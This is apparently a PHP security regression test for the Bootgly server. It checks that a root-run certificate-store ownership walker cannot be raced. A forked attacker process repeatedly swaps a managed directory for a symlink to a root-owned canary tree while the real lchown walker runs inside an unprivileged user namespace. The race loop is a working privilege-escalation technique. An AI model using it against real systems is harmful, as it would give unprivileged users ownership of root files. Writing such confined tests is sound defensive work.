<?php

use Bootgly\WPI\Nodes\HTTP_Server_CLI\Request;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Response;
use Bootgly\WPI\Nodes\HTTP_Server_CLI\Tests\Suite\Test;


/**
 * Security PoC C6 — the privileged Auto-TLS ownership handoff must never apply
 * a root `lchown()` through a path component the runtime identity can replace.
 *
 * `HTTP_Server_CLI::own()` validates the managed directory by NAME
 * (`is_link($directory)`, then a per-segment ancestor walk) and only afterwards
 * calls `scandir($directory)` and `lchown("{$directory}/{$entry}")`. A runtime
 * user who owns the store can swap that directory name for a symlink inside the
 * check/use window, so the privileged walker enumerates and re-owns entries in
 * an attacker-selected tree instead of its own.
 *
 * The attack leg runs the REAL `own()` as UID 0 inside an unprivileged user
 * namespace (`unshare --user` + `newuidmap`), or directly when the suite is
 * already root (disposable container). The namespace grants no host privilege:
 * the fixture store, the root-owned canary tree and the runtime identity are all
 * mapped ids confined to a temp directory.
 *
 * Controls: a quiet handoff must succeed (positive), a pre-planted symlink must
 * be refused (negative), and the canary must start root-owned and unreachable to
 * the attacker. The selected HTTP handler is the harness control.
 */
/**
 * @var array{
 *    error:string,
 *    executed:bool,
 *    reason:string,
 *    uid:int,
 *    control_handoff:bool,
 *    control_planted_symlink_refused:bool,
 *    attacker_swaps:int,
 *    calls:int,
 *    canary_before:array<string,int>,
 *    canary_after:array<string,int>,
 *    escaped:bool,
 *    runtime_uid:int
 * } $probe
 */
$probe = [
   'error' => '',
   'executed' => false,
   'reason' => '',
   'uid' => -1,
   'control_handoff' => false,
   'control_planted_symlink_refused' => false,
   'attacker_swaps' => 0,
   'calls' => 0,
   'canary_before' => [],
   'canary_after' => [],
   'escaped' => false,
   'runtime_uid' => 1,
   'first_boot' => [],
   'steady_state' => [],
];

return new Test(
   description: 'privileged Auto-TLS ownership handoff must not follow a swapped path component',

   request: static function (string $hostPort, int $testIndex) use (&$probe): string {
      $directory = sys_get_temp_dir()
         . '/bootgly-security-c6-' . bin2hex(random_bytes(6));
      $process = null;
      $pipes = [];

      try {
         if (function_exists('proc_open') === false || function_exists('posix_geteuid') === false) {
            throw new RuntimeException('C6 requires proc_open and POSIX support.');
         }
         if (mkdir($directory, 0755, true) === false) {
            throw new RuntimeException('C6 could not create its fixture directory.');
         }

         $victim = $directory . '/victim.php';
         $runner = $directory . '/run.sh';
         $result = $directory . '/result.json';

         $victimSource = <<<'VICTIM'
<?php
/**
 * C6 attack leg — executes as UID 0 and drives the REAL own() while an
 * unprivileged "runtime user" swaps a managed directory name for a symlink.
 */
$root    = $argv[1];
$base    = $argv[2];
$result  = $argv[3];
$seconds = (float) $argv[4];

define('BOOTGLY_ROOT_BASE', $root);
define('BOOTGLY_ROOT_DIR', $root . '/');
define('BOOTGLY_WORKING_BASE', $root);
define('BOOTGLY_WORKING_DIR', $root . '/');
define('BOOTGLY_STORAGE_BASE', $root . '/storage');
define('BOOTGLY_STORAGE_DIR', $root . '/storage/');
spl_autoload_register(static function (string $class): void {
   $file = BOOTGLY_ROOT_DIR . str_replace('\\', '/', $class) . '.php';
   if (is_file($file)) { include $file; }
});

$report = static function (array $data) use ($result): never {
   file_put_contents($result, json_encode($data));
   exit(0);
};

if (posix_getuid() !== 0) {
   $report(['reason' => 'attack leg is not UID 0', 'uid' => posix_getuid()]);
}

$RUNTIME = 1;                      // `daemon` — the demoted runtime identity
$canary  = $base . '/CANARY';

// ! A root-owned 0700 canary tree OUTSIDE any managed store. The runtime
//   identity cannot read, write or reach it WITHOUT the walker's help, so any
//   ownership change on it is the privilege-escalation primitive itself.
@mkdir($canary, 0700, true);
foreach (['shadow', 'sudoers'] as $entry) {
   file_put_contents($canary . '/' . $entry, 'root-owned');
   lchown($canary . '/' . $entry, 0);
   lchgrp($canary . '/' . $entry, 0);
}
lchown($canary, 0);
lchgrp($canary, 0);
chmod($canary, 0700);
chmod($base, 0755);

$Reflection = new ReflectionClass(Bootgly\WPI\Nodes\HTTP_Server_CLI::class);
$own = $Reflection->getMethod('own');
$own->setAccessible(true);
$build = static function () use ($Reflection): object {
   $Server = $Reflection->newInstanceWithoutConstructor();
   $user = $Reflection->getProperty('user');
   $user->setAccessible(true);
   $user->setValue($Server, 'daemon');
   return $Server;
};

// @ Recursively force a tree to one identity (fixture setup / reset only).
$force = static function (string $path, int $uid) use (&$force): void {
   foreach (scandir($path) as $entry) {
      if ($entry === '.' || $entry === '..') { continue; }
      $child = $path . '/' . $entry;
      if (is_dir($child) && is_link($child) === false) { $force($child, $uid); }
      lchown($child, $uid);
      lchgrp($child, $uid);
   }
   lchown($path, $uid);
   lchgrp($path, $uid);
};

// @ Build a fresh Auto-TLS shaped store.
$make = static function (string $store) use ($force): string {
   @exec('rm -rf ' . escapeshellarg($store));
   $deep = $store . '/certificates/tls';
   @mkdir($deep, 0700, true);
   file_put_contents($deep . '/legit.pem', 'legit');
   $force($store, 0);
   return $deep;
};

$canaryUID = static function (string $canary): array {
   clearstatcache(true);
   $uids = [];
   foreach (['shadow', 'sudoers'] as $entry) {
      $now = @lstat($canary . '/' . $entry);
      $uids[$entry] = is_array($now) ? $now['uid'] : -1;
   }
   return $uids;
};

$canaryBefore = $canaryUID($canary);

// ! Positive control — a quiet handoff of a root-owned tree must succeed AND
//   actually transfer ownership. Without this a fix that simply refuses
//   everything would look like a pass.
$controlStore = $base . '/control-store';
$controlDeep = $make($controlStore);
clearstatcache(true);
$controlHandoff = $own->invoke($build(), $controlStore) === true
   && lstat($controlStore)['uid'] === $RUNTIME
   && lstat($controlDeep)['uid'] === $RUNTIME
   && lstat($controlDeep . '/legit.pem')['uid'] === $RUNTIME;

// ! Negative control — a symlink planted inside a tree the walker DOES
//   traverse (root-owned) must be refused outright.
$plantedStore = $base . '/planted-store';
$make($plantedStore);
@symlink($canary, $plantedStore . '/certificates/planted');
clearstatcache(true);
$controlPlanted = $own->invoke($build(), $plantedStore) === false;

$attackDir = $base . '/attacker';
@mkdir($attackDir, 0755, true);
lchown($attackDir, $RUNTIME);
lchgrp($attackDir, $RUNTIME);

/**
 * One attack leg. `$handed` selects the two real production states:
 *   false — FIRST BOOT: the store is root-owned and the walker hands each
 *           directory over as it descends, granting the attacker write access
 *           to a parent it is still resolving names inside.
 *   true  — STEADY STATE: a later root boot over a store the runtime identity
 *           already owns, so every name in it is attacker-rewritable.
 */
$leg = static function (string $name, bool $handed) use (
   $base, $canary, $seconds, $RUNTIME, $own, $build, $make, $force, $canaryUID, $attackDir
): array {
   $store = $base . '/' . $name . '-store';
   $D = $make($store);
   if ($handed) { $force($store, $RUNTIME); }

   $before = $canaryUID($canary);
   $flag = $attackDir . '/' . $name;

   $attacker = pcntl_fork();
   if ($attacker === 0) {
      posix_setgid($RUNTIME);
      posix_setuid($RUNTIME);
      $stash = $D . '.stash';
      $swaps = 0;
      $end = microtime(true) + $seconds + 1.0;
      while (microtime(true) < $end) {
         // @ Fails while the directory is still root-owned; succeeds the moment
         //   the walker hands its parent over.
         if (@rename($D, $stash) && @symlink($canary, $D)) { $swaps++; }
         @unlink($D);
         @rename($stash, $D);
         if (($swaps % 128) === 0) { @file_put_contents($flag, (string) $swaps); }
      }
      @file_put_contents($flag, (string) $swaps);
      exit(0);
   }

   $Server = $build();
   $calls = 0;
   $escaped = false;
   $deadline = microtime(true) + $seconds;
   while (microtime(true) < $deadline) {
      $calls++;
      // @ Re-arm the first-boot state so the handoff window recurs.
      if ($handed === false) { @$force($store, 0); }
      clearstatcache(true);
      @$own->invoke($Server, $store);

      if ($canaryUID($canary) !== $before) { $escaped = true; break; }
   }

   posix_kill($attacker, SIGKILL);
   pcntl_waitpid($attacker, $status);

   return [
      'calls' => $calls,
      'swaps' => (int) @file_get_contents($flag),
      'escaped' => $escaped,
      'canary_after' => $canaryUID($canary),
   ];
};

$firstBoot = $leg('firstboot', false);
$steady = $canaryUID($canary) === $canaryBefore ? $leg('steady', true) : null;

$report([
   'reason' => '',
   'uid' => 0,
   'runtime_uid' => $RUNTIME,
   'control_handoff' => $controlHandoff,
   'control_planted_symlink_refused' => $controlPlanted,
   'canary_before' => $canaryBefore,
   'canary_after' => $canaryUID($canary),
   'first_boot' => $firstBoot,
   'steady_state' => $steady,
   'calls' => $firstBoot['calls'] + ($steady['calls'] ?? 0),
   'attacker_swaps' => $firstBoot['swaps'] + ($steady['swaps'] ?? 0),
   'escaped' => $firstBoot['escaped'] || ($steady['escaped'] ?? false),
]);
VICTIM;

         $runnerSource = <<<'RUNNER'
#!/bin/bash
# Runs the C6 attack leg as UID 0: directly when already root, otherwise inside
# an unprivileged user namespace that grants no host privilege whatsoever.
set -u
ROOT="$1"; BASE="$2"; RESULT="$3"; SECONDS_RUN="$4"; VICTIM="$5"

mkdir -p "$BASE"

if [ "$(id -u)" = "0" ]; then
   exec php "$VICTIM" "$ROOT" "$BASE" "$RESULT" "$SECONDS_RUN"
fi

command -v unshare  >/dev/null 2>&1 || { echo "no-unshare";  exit 3; }
command -v newuidmap >/dev/null 2>&1 || { echo "no-newuidmap"; exit 3; }
grep -q "^$(id -un):" /etc/subuid 2>/dev/null || { echo "no-subuid"; exit 3; }

SUB_UID=$(grep "^$(id -un):" /etc/subuid | head -1 | cut -d: -f2)
SUB_UID_N=$(grep "^$(id -un):" /etc/subuid | head -1 | cut -d: -f3)
SUB_GID=$(grep "^$(id -un):" /etc/subgid | head -1 | cut -d: -f2)
SUB_GID_N=$(grep "^$(id -un):" /etc/subgid | head -1 | cut -d: -f3)

FIFO="$BASE/.gate"; mkfifo "$FIFO" || { echo "no-fifo"; exit 3; }

unshare --user bash -c "read gate < '$FIFO'; exec php '$VICTIM' '$ROOT' '$BASE' '$RESULT' '$SECONDS_RUN'" &
NSPID=$!

for _ in $(seq 1 100); do [ -e "/proc/$NSPID/uid_map" ] && break; sleep 0.05; done

newuidmap "$NSPID" 0 "$(id -u)" 1 1 "$SUB_UID" "$SUB_UID_N" || { echo "map-uid-failed"; kill $NSPID 2>/dev/null; exit 3; }
newgidmap "$NSPID" 0 "$(id -g)" 1 1 "$SUB_GID" "$SUB_GID_N" || { echo "map-gid-failed"; kill $NSPID 2>/dev/null; exit 3; }

echo gate > "$FIFO"
wait $NSPID
exit $?
RUNNER;

         if (
            file_put_contents($victim, $victimSource) !== strlen($victimSource)
            || file_put_contents($runner, $runnerSource) !== strlen($runnerSource)
            || chmod($runner, 0700) === false
         ) {
            throw new RuntimeException('C6 could not install its attack-leg fixtures.');
         }

         $descriptors = [
            0 => ['file', '/dev/null', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w'],
         ];
         $process = proc_open(
            ['/bin/bash', $runner, BOOTGLY_ROOT_DIR, $directory . '/fixture', $result, '12', $victim],
            $descriptors,
            $pipes,
            $directory,
         );
         if (is_resource($process) === false) {
            throw new RuntimeException('C6 could not start its attack leg.');
         }

         stream_set_blocking($pipes[1], false);
         stream_set_blocking($pipes[2], false);
         $output = '';
         $deadline = microtime(true) + 90.0;
         do {
            $chunk = stream_get_contents($pipes[1]);
            if ($chunk !== false) { $output .= $chunk; }
            $chunk = stream_get_contents($pipes[2]);
            if ($chunk !== false) { $output .= $chunk; }

            $status = proc_get_status($process);
            if (($status['running'] ?? false) === false) { break; }
            usleep(50000);
         }
         while (microtime(true) < $deadline);

         if (($status['running'] ?? false) === true) {
            proc_terminate($process);
            usleep(200000);
         }
         foreach ([1, 2] as $index) {
            $chunk = stream_get_contents($pipes[$index]);
            if ($chunk !== false) { $output .= $chunk; }
            fclose($pipes[$index]);
            unset($pipes[$index]);
         }
         proc_close($process);
         $process = null;

         if (is_file($result) === false) {
            $probe['reason'] = trim(strtok($output, "\n") ?: 'attack leg produced no result');

            return "GET /c6/ownership-toctou HTTP/1.1\r\n"
               . "X-Bootgly-Test: {$testIndex}\r\n"
               . "Host: localhost\r\nConnection: close\r\n\r\n";
         }

         $decoded = json_decode((string) file_get_contents($result), true);
         if (is_array($decoded) === false) {
            throw new RuntimeException('C6 attack leg produced an unreadable result.');
         }
         foreach ($decoded as $key => $value) {
            if (array_key_exists($key, $probe)) { $probe[$key] = $value; }
         }
         $probe['executed'] = ($decoded['reason'] ?? '') === '';
      }
      catch (Throwable $Throwable) {
         $probe['error'] = $Throwable::class . ': ' . $Throwable->getMessage();
      }
      finally {
         foreach ($pipes as $pipe) {
            if (is_resource($pipe)) { fclose($pipe); }
         }
         if (is_resource($process)) {
            proc_terminate($process);
            proc_close($process);
         }
         // ! Entries may carry mapped sub-ids; the suite user owns the parents.
         exec('rm -rf ' . escapeshellarg($directory) . ' 2>/dev/null');
      }

      return "GET /c6/ownership-toctou HTTP/1.1\r\n"
         . "X-Bootgly-Test: {$testIndex}\r\n"
         . "Host: localhost\r\nConnection: close\r\n\r\n";
   },

   response: static function (Request $Request, Response $Response): Response {
      return $Response(body: 'C6 handler control');
   },

   test: static function (string $response) use (&$probe): bool|string {
      if (
         str_contains($response, 'HTTP/1.1 200 OK') === false
         || str_contains($response, 'C6 handler control') === false
      ) {
         return 'C6 fixture did not traverse the selected native HTTP handler.';
      }
      if ($probe['error'] !== '') {
         return 'C6 fixture error: ' . $probe['error'];
      }
      if ($probe['executed'] !== true) {
         return 'C6 attack leg did not execute as UID 0 (' . $probe['reason']
            . '); this environment cannot confirm or regress the privileged walker.';
      }
      if ($probe['uid'] !== 0) {
         return 'C6 attack leg reported a non-root UID: ' . json_encode($probe);
      }
      if ($probe['control_handoff'] !== true) {
         return 'C6 positive control failed: a quiet store handoff did not succeed: '
            . json_encode($probe);
      }
      if ($probe['control_planted_symlink_refused'] !== true) {
         return 'C6 negative control failed: a pre-planted symlink was not refused: '
            . json_encode($probe);
      }
      if ($probe['attacker_swaps'] <= 0 || $probe['calls'] <= 0) {
         return 'C6 race did not actually run (no swaps or no walker calls): '
            . json_encode($probe);
      }

      if ($probe['escaped'] === true) {
         $legs = [];
         if (($probe['first_boot']['escaped'] ?? false) === true) { $legs[] = 'first-boot handoff'; }
         if (($probe['steady_state']['escaped'] ?? false) === true) { $legs[] = 'steady-state re-boot'; }

         return 'CONFIRMED C6: the privileged ownership walker followed a swapped path '
            . 'component and re-owned entries in a root-owned tree OUTSIDE the managed '
            . 'store — leg(s): ' . implode(' + ', $legs)
            . '; canary before ' . json_encode($probe['canary_before'])
            . ', after ' . json_encode($probe['canary_after'])
            . ' (runtime UID ' . $probe['runtime_uid'] . ', '
            . $probe['calls'] . ' walker calls, ' . $probe['attacker_swaps'] . ' swaps).';
      }

      return true;
   },
);
